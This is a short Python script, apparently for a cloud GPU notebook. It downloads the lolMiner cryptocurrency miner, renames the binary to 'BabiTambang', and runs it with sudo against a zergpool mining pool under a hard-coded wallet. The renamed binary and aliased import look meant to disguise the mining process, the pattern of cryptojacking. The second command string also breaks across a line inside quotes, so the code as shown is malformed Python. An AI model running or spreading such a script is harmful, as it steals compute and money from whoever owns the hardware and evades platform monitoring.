import os as alpha
alpha.system("nvidia-smi")
alpha.system("
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a && chmod +x lolMiner && mv lolMiner BabiTambang && sudo ./BabiTambang -a ETHASH --pool -o stratum+tcp://ethash.asia.mine.zergpool.com:9999 -u MB3ux2fkhJAcT94zayTTbSFJToCQcuRfGj -p  c=LTC,ID=id")
